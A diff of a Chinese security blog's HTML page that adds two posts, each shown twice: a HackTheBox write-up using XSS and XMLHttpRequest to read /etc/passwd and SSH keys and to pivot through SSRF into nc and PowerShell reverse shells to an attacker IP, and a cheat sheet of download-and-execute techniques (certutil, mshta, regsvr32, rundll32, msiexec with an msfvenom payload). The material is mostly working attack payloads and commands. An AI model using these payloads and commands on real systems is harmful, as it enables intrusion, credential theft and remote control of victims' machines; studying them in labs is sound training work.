@@ -118,6 +118,228 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/" class="title">从两道靶场题目看XHR</a>
+    <section class="desc">
+  首发于先知社区：https://xz.aliyun.com/t/7473/
+#0x01、什么是XHRXHR，也就是XMLHttpRequest，是现代浏览器都有的一个内置对象，使用 XMLHttpRequest对象可以与服务器交互。无需刷新整个页面即可从URL获取数据，允许网页在不影响用户的操作的情况下更新页面的局部内容，多应用于 AJAX 编程中。
+特别注意的是XMLHttpRequest 可以用于获取任何类型的数据，而不仅仅是XML，它甚至支持 HTTP 以外的协议（包括 file:// 和 FTP）
+#0x02、利用一：读取本地文件
+适用于XSS打到后台管理员，以普通用户身份构造payload发送给管理员，登录后台触发payload并查看回显（也就是拿到cookie能够登录后台的情况）
+以Hackthebox的book靶场为例：
+情景描述：普通用户能够上传pdf文件，且能够自定义Title和Author，管理员能够下载用户上传的pdf；登录管理员发现Title字段插入的xss解析并显示在管理员能够看到的pdf标题中
+
+验证：Title字段插入内容更改为
+1&lt;script&gt;document.write(Date());&lt;/script&gt;
+
+进一步利用：利用XHR读取本地文件
+本来直接想到的是在浏览器本地同源的情况下file协议读取：&lt;利用iframe的file协议&gt;
+&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;
+没有回显
+&lt;script&gt;document.write(&apos;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&apos;)&lt;/script&gt;还是没有回显
+姿势不够，直接使用iframe插入paylaod没有回显，但是说明了可以使用file协议，尝试使用XHR发送Ajax请求并利用File协议读取：
+&lt;script&gt;
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);
+x.send();
+ &lt;/script&gt;Tips：由于这里对Title内容没有字数限制，所以我直接插入完整paylaod，有字数限制的情况下可以写入js文件中，后面会讲到
+
+同样的方法可以直接读取到该服务器的用户ssh私钥进行登录
+#0x03、利用二：由XSS到SSRF之命令执行
+这个条件比较苛刻，需要有命令执行，但是对执行者的IP进行验证，这里以HackTheBox的Bankrobber中的例子为例
+情景描述：页面端有个backdoorchecker.php页面，能够执行dir命令(限制不严，很简单就绕过)，但是只允许本地执行，直接看代码（通过SQL注入已读取到源码）
+
+简易思路:现有XSS，尝试结合XMLHttpRequest借用本地账户进行操作：借用管理员身份打开backerdoorchecker.php绕过IP限制（即转换成SSRF），并构造payload绕过命令执行限制
+漏洞利用：借助smb执行我们攻击机上的nc反弹shell （smb服务可以借助impacket套件中的smbserver.py快速搭建）Payload：
+&lt;script&gt; var x = new XMLHttpRequest(); x.open(&quot;POST&quot;, &quot;backdoorchecker.php&quot;, true); x.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;); x.send(&apos;cmd=dir xxx || \\\\10.10.16.21\\ica\\nc.exe -e cmd.exe 10.10.16.21 9999&apos;);&lt;/script&gt;nc -lvvp 9999 即可回弹shell
+#0x04、一点小小扩展这里可以把payload写到js文件中，然后插入我们的js文件即可，关于如何编写XHR的js文件的链接会放到文末。这里针对利用二，还有另外的利用方式，即通过powershell IEX下载脚本并反弹PowerShellTcp.ps1并反弹。既然提到了js文件的方式，就以这种方式构造payload：XSS框直接插入：    
+Reverse.js文件内容如下：
+function paintfunc(){
+ var http = new XMLHttpRequest();
+     var url = &apos;http://localhost/admin/backdoorchecker.php&apos;;
+     var params = &apos;cmd=dir| powershell -c &quot;iex (New-Object Net.WebClient).DownloadString(\&apos;http://10.10.16.21:8000/Invoke-PowerShellTcp.ps1\&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 9969&quot;&apos;;
+     http.open(&apos;POST&apos;, url, true);
+     http.setRequestHeader(&apos;Content-type&apos;, &apos;application/x-www-form-urlencoded&apos;);
+     http.send(params);
+}
+paintfunc();#0x05、题后话1）、关于XSS结合XHR还有更多利用，如不能登录后台的情况下添加管理员等
+2）、关于iframe没有回显的问题：这是由于iframe是通过浏览器本地同源来进行加载文件的，即不能通过网络加载，我们简单做个测试：创建iframe.html,写入如下语句
+&lt;iframe src=&quot;file:///F:/password.txt&quot;&gt;&lt;/iframe&gt;直接在本地直接打开
+
+放到网站目录下通过浏览器访问：
+
+链接：
+https://www.w3schools.com/xml/xml_http.asp 
+http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/
+https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/
+
+
+</section>
+    <p class="sub">Apr 19, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
+    <a href="/2020/04/19/multi-ways-file-download/" class="title">multi-ways-file-download</a>
+    <section class="desc">
+  这里我分为三个模块：Linux、Windows、常见语言环境
+#Linux#
+1、curlcurl -O http://xx.xx.xx.xx/filename 
+curl http://xx.xx.xx.xx/filename  -o path/filename2、wgetwget http://xx.xx.xx.xx/filename  [-o path/filename]3、nc3.1、发送方主动连接目标机器接收方先执行命令
+发送方：
+nc -w 3 [destination] 1234 &lt; out.file
+接收方:
+nc -l -p 1234 &gt; out.file3.2、目标机器主动连接发送方cat file | nc -l 1234   ###发送方将文件内容打印到本地1234端口，接收方访问1234端口接收文件
+nc  launcher_ip 1234 &gt; file  ####接收方4、利用linux自带base64命令本地将(可执行)文件转换为base64
+python -c &apos;print(__import__(&quot;base64&quot;).b64encode(open(&quot;file&quot;, &quot;rb&quot;).read()))&apos;目标机器执行：
+echo &quot;strings&quot; | base64 -d &gt; out.file5、SCPscp username@servername:/path/filename /tmp/local_destination当然，windows有ssh的也可以使用，只是Linux一般比较多
+Windows1、Powershell1.1、IEX调用WebClient[1]
+IEX(New-Object System.Net.WebClient).DownloadFile($url, $output)   ####下载[2]    
+powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.67:8000/PowerUp.ps1&apos;); Invoke-AllChecks&quot; ##加载PS1到内存并执行1.2、WebRequest下载：Invoke-WebRequest  （-Uri） http://10.10.14.67:8000/procdump.exe -outfile ./procdump.exe  ###cmd下前面加powershell1.3、BitsTransferStart-BitsTransfer -Source $url -Destination $output  ###cmd下前面加powershell2、SMB2.1、powershellCopy-Item -Source \\10.10.101.222\share\xxx.exe -Destination C:\path\2.2、CMDcopy \\10.10.101.222\share\xxx.exe或者
+Robocopy : https://www.microsoft.com/en-us/download/details.aspx?id=176573、CURL高版本windows自带
+curl -O  http://10.10.101.222:8000/xxx.exe
+culr  http://10.10.101.222:8000/xxx.exe -o C:/tmp/xxx.exe 4、FTPecho open 10.10.101.222 21&gt; ftp.txt
+echo ftp&gt;&gt; ftp.txt
+echo bin &gt;&gt; ftp.txt
+echo ftp&gt;&gt; ftp.txt
+echo GET xxx.exe &gt;&gt; ftp.txt
+ftp -s:ftp.txt或交互式shell情况下直接ftp登录到攻击机(开启ftp) get filename（linux开启ftp同样适用）
+5、VBS5.1、.vbs文件内容Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)
+Set Shell = CreateObject(&quot;Wscript.Shell&quot;)
+Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0
+Post.Send()
+Set aGet = CreateObject(&quot;ADODB.Stream&quot;)
+aGet.Mode = 3
+aGet.Type = 1
+aGet.Open()
+aGet.Write(Post.responseBody)
+aGet.SaveToFile &quot;C:\test\update\xxx.exe&quot;,25.2、CMD下执行echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;) &gt;&gt;download.vbs
+echo Set Shell = CreateObject(&quot;Wscript.Shell&quot;) &gt;&gt;download.vbs
+echo Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0 &gt;&gt;download.vbs
+echo Post.Send() &gt;&gt;download.vbs
+echo Set aGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt;download.vbs
+echo aGet.Mode = 3 &gt;&gt;download.vbs
+echo aGet.Type = 1 &gt;&gt;download.vbs
+echo aGet.Open() &gt;&gt;download.vbs
+echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs
+echo aGet.SaveToFile &quot;C:\tmp\xxx.exe&quot;,2 &gt;&gt;download.vbs5.3、wget.vbson error resume next
+iLocal=LCase(Wscript.Arguments(1))
+iRemote=LCase(Wscript.Arguments(0))
+iUser=LCase(Wscript.Arguments(2))
+iPass=LCase(Wscript.Arguments(3))
+set xPost=CreateObject(&quot;Microsoft.XMLHTTP&quot;)
+if iUser=&quot;&quot; and iPass=&quot;&quot; then
+xPost.Open &quot;GET&quot;,iRemote,0
+else
+xPost.Open &quot;GET&quot;,iRemote,0,iUser,iPass
+end if
+xPost.Send()
+set sGet=CreateObject(&quot;ADODB.Stream&quot;)
+sGet.Mode=3
+sGet.Type=1
+sGet.Open()
+sGet.Write xPost.ResponseBody
+sGet.SaveToFile iLocal,2cscript wget.vbs http://10.10.101.222:8000/xxx.exe
+6、CSC.exeCSC.exe是windows自带的C#编译器CSC.exe路径需要绝对路径，且路径根据.net版本而定download.cs：（利用echo依次写入如下内容）
+using System.Net;
+namespace downloader
+{
+    class Program
+    {
+    static void Main(string[] args)
+    {
+        WebClient client = new WebClient();
+        string URLAddress = @&quot;http://10.10.101.222:8000/xxx.exe&quot;;
+        string receivePath = @&quot;C:\tmp\&quot;;
+        client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName
+(URLAddress));
+    }
+ }
+}执行：C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tmp\download.exe C:\tmp\download.cs
+7、记事本文件下载notepad中:打开–&gt;输入URL （win10 不支持？？？）
+8、JScript下载.js文件内容
+var Object = WScript.CreateObject(&quot;MSXML2.XMLHTTP&quot;);
+Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);
+Object.send();
+if (Object.Status == 200)
+{
+   var Stream = WScript.CreateObject(&quot;ADODB.Stream&quot;);
+   Stream.Open();
+   Stream.Type = 1;
+   Stream.Write(Object.ResponseBody);
+   Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;, 2);
+Stream.Close();
+}执行： node download.js或合并成一句话形式：也就是rundll32
+rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}9、bitsadmin不支持https,ftp协议，使用SimpleHttpServer会报错
+bitsadmin /transfer n http://10.10.101.222:8000\xxx.exe  C:\tmp\xxx.exe10、Certutilcertutil.exe -urlcache -split -f http://10.10.101.222:8000/xxx.exe xxx.exe  ###下载文件
+certutil -urlcache -split -f http://10.10.101.222:8000/xxx.exe delete   ###删除缓存11、msiexec  （远程执行）https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/
+msfvenom -p windows/exec CMD=cmd.exe -f msi &gt; evil.msi
+msiexec /q /i http://10.10.101.222:8000/evil.msi12、IEExecC:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; caspol -s off   ####需管理员身份
+C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; IEExec http://10.10.101.222:8000/xxx.exe13、mshtamshta http://10.10.101.222/run.htarun.hta
+&lt;HTML&gt; 
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; 
+&lt;HEAD&gt; 
+&lt;script language=&quot;VBScript&quot;&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;cmd.exe /c net user&quot; // 这里填写命令 
+self.close &lt;/script&gt; 
+    &lt;body&gt; demo &lt;/body&gt; 
+&lt;/HEAD&gt;
+&lt;/HTML&gt;14、rundll32rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}15、regsvr32：https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/
+regsvr32 /u /s /i:http://10.10.101.222:8000/run.sct scrobj.dllrun.sct:
+&lt;?XML version=&quot;1.0&quot;?&gt; 
+&lt;scriptlet&gt; 
+&lt;registration     
+    progid=&quot;ShortJSRAT&quot;     
+    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;     
+    &lt;!-- Learn from Casey Smith @subTee --&gt;     
+    &lt;script language=&quot;JScript&quot;&gt;         
+        &lt;![CDATA[             
+            ps  = &quot;cmd.exe /c calc.exe&quot;;   ####命令执行          
+            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);         
+            ]]&gt; 
+&lt;/script&gt; 
+&lt;/registration&gt;
+&lt;/scriptlet&gt;常见编程环境下载Python1、命令行版本python -c &quot;import urllib2;u=urllib2.urlopen(&quot;http://xx.xxx.xx/filename&quot;);localfile=open(&apos;c:\tmp\filename&apos;,&apos;w&apos;);localfile.write(u.read());localfile.close();&quot;2、脚本执行版本#!python
+#!/usr/bin/python
+import urllib2
+u = urllib2.urlopen(&apos;http://domain/file&apos;)
+localFile = open(&apos;local_file&apos;, &apos;w&apos;)    
+localFile.write(u.read())
+localFile.close()kali@kali:~# python test.py
+3、通过python脚本构造任意文件上传页面： https://0day.work/finding-an-arbitrary-file-upload-vulnerability-in-a-filesharing-script/
+Perl1、命令行版本perl -MLWP::Simple -e &apos;getstore (&quot;http://xx.xx.xx.xx/filename&quot;,&quot;filename&quot;)&apos;2、脚本执行
+#!/usr/bin/perl
+use LWP::Simple;
+getstore(&quot;http://domain/file&quot;, &quot;file&quot;);kali@kali:~# perl test.pl
+Ruby#!ruby
+#!/usr/bin/ruby
+require &apos;net/http&apos;
+Net::HTTP.start(&quot;www.domain.com&quot;) { |http|
+r = http.get(&quot;/file&quot;)
+open(&quot;save_location&quot;, &quot;wb&quot;) { |file|
+file.write(r.body)
+}
+}kali@kali:~# ruby test.rb
+PHP1、命令行
+php -r &apos;$data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);fwrite($f, $data[0]);fclose($f);&apos;2、脚本执行
+&lt;?php 
+$data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);
+$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);
+fwrite($f, $data[0]);
+fclose($f);?&gt;kali@kali:~# php test.php
+
+
+</section>
+    <p class="sub">Apr 19, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/19/Rerverse-shell-Interactive-shell/" class="title">Rerverse_shell&amp;Interactive_shell</a>
     <section class="desc">
   1、NC1.1、NC reverse shell1.1.1、-e参数（目标机器上执行）
@@ -279,6 +501,258 @@ select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from 
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="从两道靶场题目看XHR" alt="从两道靶场题目看XHR" href="/2020/04/19/%E4%BB%8E%E4%B8%A4%E9%81%93%E9%9D%B6%E5%9C%BA%E9%A2%98%E7%9B%AE%E7%9C%8BXHR/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="从两道靶场题目看XHR" alt="从两道靶场题目看XHR"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 从两道靶场题目看XHR &gt;</div>
+                            <div class="content flex1">
+                                
+  首发于先知社区：https://xz.aliyun.com/t/7473/
+#0x01、什么是XHRXHR，也就是XMLHttpRequest，是现代浏览器都有的一个内置对象，使用 XMLHttpRequest对象可以与服务器交互。无需刷新整个页面即可从URL获取数据，允许网页在不影响用户的操作的情况下更新页面的局部内容，多应用于 AJAX 编程中。
+特别注意的是XMLHttpRequest 可以用于获取任何类型的数据，而不仅仅是XML，它甚至支持 HTTP 以外的协议（包括 file:// 和 FTP）
+#0x02、利用一：读取本地文件
+适用于XSS打到后台管理员，以普通用户身份构造payload发送给管理员，登录后台触发payload并查看回显（也就是拿到cookie能够登录后台的情况）
+以Hackthebox的book靶场为例：
+情景描述：普通用户能够上传pdf文件，且能够自定义Title和Author，管理员能够下载用户上传的pdf；登录管理员发现Title字段插入的xss解析并显示在管理员能够看到的pdf标题中
+
+验证：Title字段插入内容更改为
+1&lt;script&gt;document.write(Date());&lt;/script&gt;
+
+进一步利用：利用XHR读取本地文件
+本来直接想到的是在浏览器本地同源的情况下file协议读取：&lt;利用iframe的file协议&gt;
+&lt;iframe src=&quot;file:///etc/passwd&quot;&gt;&lt;/iframe&gt;
+没有回显
+&lt;script&gt;document.write(&apos;&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;&apos;)&lt;/script&gt;还是没有回显
+姿势不够，直接使用iframe插入paylaod没有回显，但是说明了可以使用file协议，尝试使用XHR发送Ajax请求并利用File协议读取：
+&lt;script&gt;
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write(this.responseText)
+};
+x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);
+x.send();
+ &lt;/script&gt;Tips：由于这里对Title内容没有字数限制，所以我直接插入完整paylaod，有字数限制的情况下可以写入js文件中，后面会讲到
+
+同样的方法可以直接读取到该服务器的用户ssh私钥进行登录
+#0x03、利用二：由XSS到SSRF之命令执行
+这个条件比较苛刻，需要有命令执行，但是对执行者的IP进行验证，这里以HackTheBox的Bankrobber中的例子为例
+情景描述：页面端有个backdoorchecker.php页面，能够执行dir命令(限制不严，很简单就绕过)，但是只允许本地执行，直接看代码（通过SQL注入已读取到源码）
+
+简易思路:现有XSS，尝试结合XMLHttpRequest借用本地账户进行操作：借用管理员身份打开backerdoorchecker.php绕过IP限制（即转换成SSRF），并构造payload绕过命令执行限制
+漏洞利用：借助smb执行我们攻击机上的nc反弹shell （smb服务可以借助impacket套件中的smbserver.py快速搭建）Payload：
+&lt;script&gt; var x = new XMLHttpRequest(); x.open(&quot;POST&quot;, &quot;backdoorchecker.php&quot;, true); x.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;); x.send(&apos;cmd=dir xxx || \\\\10.10.16.21\\ica\\nc.exe -e cmd.exe 10.10.16.21 9999&apos;);&lt;/script&gt;nc -lvvp 9999 即可回弹shell
+#0x04、一点小小扩展这里可以把payload写到js文件中，然后插入我们的js文件即可，关于如何编写XHR的js文件的链接会放到文末。这里针对利用二，还有另外的利用方式，即通过powershell IEX下载脚本并反弹PowerShellTcp.ps1并反弹。既然提到了js文件的方式，就以这种方式构造payload：XSS框直接插入：    
+Reverse.js文件内容如下：
+function paintfunc(){
+ var http = new XMLHttpRequest();
+     var url = &apos;http://localhost/admin/backdoorchecker.php&apos;;
+     var params = &apos;cmd=dir| powershell -c &quot;iex (New-Object Net.WebClient).DownloadString(\&apos;http://10.10.16.21:8000/Invoke-PowerShellTcp.ps1\&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 9969&quot;&apos;;
+     http.open(&apos;POST&apos;, url, true);
+     http.setRequestHeader(&apos;Content-type&apos;, &apos;application/x-www-form-urlencoded&apos;);
+     http.send(params);
+}
+paintfunc();#0x05、题后话1）、关于XSS结合XHR还有更多利用，如不能登录后台的情况下添加管理员等
+2）、关于iframe没有回显的问题：这是由于iframe是通过浏览器本地同源来进行加载文件的，即不能通过网络加载，我们简单做个测试：创建iframe.html,写入如下语句
+&lt;iframe src=&quot;file:///F:/password.txt&quot;&gt;&lt;/iframe&gt;直接在本地直接打开
+
+放到网站目录下通过浏览器访问：
+
+链接：
+https://www.w3schools.com/xml/xml_http.asp 
+http://heartsky.info/2017/08/30/%E6%B5%85%E8%B0%88-XSS-%E5%8F%91%E9%80%81%E5%A4%96%E5%9F%9F%E8%AF%B7%E6%B1%82/
+https://blog.0daylabs.com/2014/11/01/xss-ex-filtrating-data-xmlhttprequest-js-pentesters-task-15-write/
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 19, 2020</span>
+                            </div>
+                        </div>
+                    </a>
+                
+                    <a title="multi-ways-file-download" alt="multi-ways-file-download" href="/2020/04/19/multi-ways-file-download/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="multi-ways-file-download" alt="multi-ways-file-download"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; multi-ways-file-download &gt;</div>
+                            <div class="content flex1">
+                                
+  这里我分为三个模块：Linux、Windows、常见语言环境
+#Linux#
+1、curlcurl -O http://xx.xx.xx.xx/filename 
+curl http://xx.xx.xx.xx/filename  -o path/filename2、wgetwget http://xx.xx.xx.xx/filename  [-o path/filename]3、nc3.1、发送方主动连接目标机器接收方先执行命令
+发送方：
+nc -w 3 [destination] 1234 &lt; out.file
+接收方:
+nc -l -p 1234 &gt; out.file3.2、目标机器主动连接发送方cat file | nc -l 1234   ###发送方将文件内容打印到本地1234端口，接收方访问1234端口接收文件
+nc  launcher_ip 1234 &gt; file  ####接收方4、利用linux自带base64命令本地将(可执行)文件转换为base64
+python -c &apos;print(__import__(&quot;base64&quot;).b64encode(open(&quot;file&quot;, &quot;rb&quot;).read()))&apos;目标机器执行：
+echo &quot;strings&quot; | base64 -d &gt; out.file5、SCPscp username@servername:/path/filename /tmp/local_destination当然，windows有ssh的也可以使用，只是Linux一般比较多
+Windows1、Powershell1.1、IEX调用WebClient[1]
+IEX(New-Object System.Net.WebClient).DownloadFile($url, $output)   ####下载[2]    
+powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://10.10.14.67:8000/PowerUp.ps1&apos;); Invoke-AllChecks&quot; ##加载PS1到内存并执行1.2、WebRequest下载：Invoke-WebRequest  （-Uri） http://10.10.14.67:8000/procdump.exe -outfile ./procdump.exe  ###cmd下前面加powershell1.3、BitsTransferStart-BitsTransfer -Source $url -Destination $output  ###cmd下前面加powershell2、SMB2.1、powershellCopy-Item -Source \\10.10.101.222\share\xxx.exe -Destination C:\path\2.2、CMDcopy \\10.10.101.222\share\xxx.exe或者
+Robocopy : https://www.microsoft.com/en-us/download/details.aspx?id=176573、CURL高版本windows自带
+curl -O  http://10.10.101.222:8000/xxx.exe
+culr  http://10.10.101.222:8000/xxx.exe -o C:/tmp/xxx.exe 4、FTPecho open 10.10.101.222 21&gt; ftp.txt
+echo ftp&gt;&gt; ftp.txt
+echo bin &gt;&gt; ftp.txt
+echo ftp&gt;&gt; ftp.txt
+echo GET xxx.exe &gt;&gt; ftp.txt
+ftp -s:ftp.txt或交互式shell情况下直接ftp登录到攻击机(开启ftp) get filename（linux开启ftp同样适用）
+5、VBS5.1、.vbs文件内容Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)
+Set Shell = CreateObject(&quot;Wscript.Shell&quot;)
+Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0
+Post.Send()
+Set aGet = CreateObject(&quot;ADODB.Stream&quot;)
+aGet.Mode = 3
+aGet.Type = 1
+aGet.Open()
+aGet.Write(Post.responseBody)
+aGet.SaveToFile &quot;C:\test\update\xxx.exe&quot;,25.2、CMD下执行echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;) &gt;&gt;download.vbs
+echo Set Shell = CreateObject(&quot;Wscript.Shell&quot;) &gt;&gt;download.vbs
+echo Post.Open &quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,0 &gt;&gt;download.vbs
+echo Post.Send() &gt;&gt;download.vbs
+echo Set aGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt;download.vbs
+echo aGet.Mode = 3 &gt;&gt;download.vbs
+echo aGet.Type = 1 &gt;&gt;download.vbs
+echo aGet.Open() &gt;&gt;download.vbs
+echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs
+echo aGet.SaveToFile &quot;C:\tmp\xxx.exe&quot;,2 &gt;&gt;download.vbs5.3、wget.vbson error resume next
+iLocal=LCase(Wscript.Arguments(1))
+iRemote=LCase(Wscript.Arguments(0))
+iUser=LCase(Wscript.Arguments(2))
+iPass=LCase(Wscript.Arguments(3))
+set xPost=CreateObject(&quot;Microsoft.XMLHTTP&quot;)
+if iUser=&quot;&quot; and iPass=&quot;&quot; then
+xPost.Open &quot;GET&quot;,iRemote,0
+else
+xPost.Open &quot;GET&quot;,iRemote,0,iUser,iPass
+end if
+xPost.Send()
+set sGet=CreateObject(&quot;ADODB.Stream&quot;)
+sGet.Mode=3
+sGet.Type=1
+sGet.Open()
+sGet.Write xPost.ResponseBody
+sGet.SaveToFile iLocal,2cscript wget.vbs http://10.10.101.222:8000/xxx.exe
+6、CSC.exeCSC.exe是windows自带的C#编译器CSC.exe路径需要绝对路径，且路径根据.net版本而定download.cs：（利用echo依次写入如下内容）
+using System.Net;
+namespace downloader
+{
+    class Program
+    {
+    static void Main(string[] args)
+    {
+        WebClient client = new WebClient();
+        string URLAddress = @&quot;http://10.10.101.222:8000/xxx.exe&quot;;
+        string receivePath = @&quot;C:\tmp\&quot;;
+        client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName
+(URLAddress));
+    }
+ }
+}执行：C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tmp\download.exe C:\tmp\download.cs
+7、记事本文件下载notepad中:打开–&gt;输入URL （win10 不支持？？？）
+8、JScript下载.js文件内容
+var Object = WScript.CreateObject(&quot;MSXML2.XMLHTTP&quot;);
+Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);
+Object.send();
+if (Object.Status == 200)
+{
+   var Stream = WScript.CreateObject(&quot;ADODB.Stream&quot;);
+   Stream.Open();
+   Stream.Type = 1;
+   Stream.Write(Object.ResponseBody);
+   Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;, 2);
+Stream.Close();
+}执行： node download.js或合并成一句话形式：也就是rundll32
+rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}9、bitsadmin不支持https,ftp协议，使用SimpleHttpServer会报错
+bitsadmin /transfer n http://10.10.101.222:8000\xxx.exe  C:\tmp\xxx.exe10、Certutilcertutil.exe -urlcache -split -f http://10.10.101.222:8000/xxx.exe xxx.exe  ###下载文件
+certutil -urlcache -split -f http://10.10.101.222:8000/xxx.exe delete   ###删除缓存11、msiexec  （远程执行）https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/
+msfvenom -p windows/exec CMD=cmd.exe -f msi &gt; evil.msi
+msiexec /q /i http://10.10.101.222:8000/evil.msi12、IEExecC:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; caspol -s off   ####需管理员身份
+C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; IEExec http://10.10.101.222:8000/xxx.exe13、mshtamshta http://10.10.101.222/run.htarun.hta
+&lt;HTML&gt; 
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; 
+&lt;HEAD&gt; 
+&lt;script language=&quot;VBScript&quot;&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;cmd.exe /c net user&quot; // 这里填写命令 
+self.close &lt;/script&gt; 
+    &lt;body&gt; demo &lt;/body&gt; 
+&lt;/HEAD&gt;
